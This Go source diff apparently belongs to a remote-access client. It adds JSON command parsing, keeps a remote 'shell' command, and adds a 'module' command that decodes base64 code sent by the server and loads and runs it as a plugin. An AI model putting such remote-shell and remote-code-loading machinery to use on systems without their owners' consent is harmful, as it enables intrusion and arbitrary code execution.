@@ -1,11 +1,15 @@
 package session
 
 import (
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"net"
 	"src/Client/generic/commands"
 	"src/Client/generic/logger"
+	"src/Client/generic/rpc_client"
 	"src/Client/session/protocol"
+	"strings"
 )
 
 func commandHandler(conn net.Conn) error {
@@ -35,32 +39,76 @@ func commandHandler(conn net.Conn) error {
 func processCommand(conn net.Conn, command string) error {
 	logger.Log(fmt.Sprintf("Received command: %s", command))
 
-	var commandResponse string
-	// Example of handling a specific command
-	switch command {
-	case "systeminfo":
-		logger.Log("Received systeminfo command, responding with system information.")
-		commandResponse = commands.SysInfoString()
-	case "listfiles":
-		logger.Log("Received listfiles command, responding with file list.")
-		dir, error := protocol.ReceiveData(conn)
-		if error != nil {
-			logger.Error(fmt.Sprintf("Failed to receive directory for listfiles command: %v", error))
-			commandResponse = "Error receiving directory for listfiles command."
-		} else {
-			commandResponse = commands.DirOutputAsString(string(dir))
+	var cmdName string
+	var cmdData string
+
+	var jsonCmd map[string]json.RawMessage
+	if err := json.Unmarshal([]byte(command), &jsonCmd); err == nil && len(jsonCmd) == 1 {
+		for k, v := range jsonCmd {
+			cmdName = k
+			cmdData = string(v)
 		}
+		// Remove possible surrounding quotes from cmdData if it's a string
+		cmdData = strings.Trim(cmdData, "\"")
+	} else {
+		// Fallback: Parse as space-separated command
+		parts := strings.SplitN(command, " ", 2)
+		cmdName = parts[0]
+		if len(parts) > 1 {
+			cmdData = parts[1]
+		}
+	}
+
+	var response string
+
+	// Handle built-in and dynamic commands
+	switch cmdName {
 	case "shell":
-		logger.Log("Received shell command, executing shell command.")
+		logger.Log("Received shell command, executing shell handler.")
 		commands.ShellHandler(conn)
+		return nil
+	case "module":
+		logger.Log("Received module command, loading dynamic plugin.")
+		var moduleData struct {
+			Name string `json:"name"`
+			Data string `json:"data"`
+		}
+		if err := json.Unmarshal([]byte(cmdData), &moduleData); err != nil {
+			logger.Error(fmt.Sprintf("Failed to unmarshal module data: %v", err))
+			response = "Error: Malformed data for 'module' command: " + err.Error()
+		} else {
+			decoded, err := base64.StdEncoding.DecodeString(moduleData.Data)
+			if err != nil {
+				logger.Error(fmt.Sprintf("Failed to decode module data: %v", err))
+				response = "Error: Failed to decode module data: " + err.Error()
+			} else if err := rpc_client.LoadDynamicCommandFromSession(moduleData.Name, decoded); err != nil {
+				logger.Error(fmt.Sprintf("Failed to load module %s: %v", moduleData.Name, err))
+				response = fmt.Sprintf("Error loading module %s: %v", moduleData.Name, err)
+			} else {
+				response = fmt.Sprintf("Module %s loaded successfully", moduleData.Name)
+			}
+		}
 	default:
-		logger.Log(fmt.Sprintf("Unknown command: %s", command))
+		if rpc_client.HasCommand(cmdName) {
+			logger.Log(fmt.Sprintf("Executing dynamic session command: '%s'", cmdName))
+			resp, err := rpc_client.ExecuteFromSession(cmdName, []string{cmdData})
+			if err != nil {
+				logger.Error(fmt.Sprintf("Error executing %s: %v", cmdName, err))
+				response = fmt.Sprintf("Error executing %s: %v", cmdName, err)
+			} else {
+				response = resp
+			}
+		} else {
+			logger.Log(fmt.Sprintf("Unknown session command: %s", cmdName))
+			response = fmt.Sprintf("Unknown command: %s", cmdName)
+		}
 	}
 
-	if commandResponse != "" {
-		protocol.SendData(conn, []byte(commandResponse))
-		logger.Log(fmt.Sprintf("Sent response for command: %s", command))
+	// Send response back to server
+	if err := protocol.SendData(conn, []byte(response)); err != nil {
+		logger.Error(fmt.Sprintf("Failed to send response for command %s: %v", cmdName, err))
+		return fmt.Errorf("failed to send response: %w", err)
 	}
-
+	logger.Log(fmt.Sprintf("Sent response for command: %s", cmdName))
 	return nil
 }
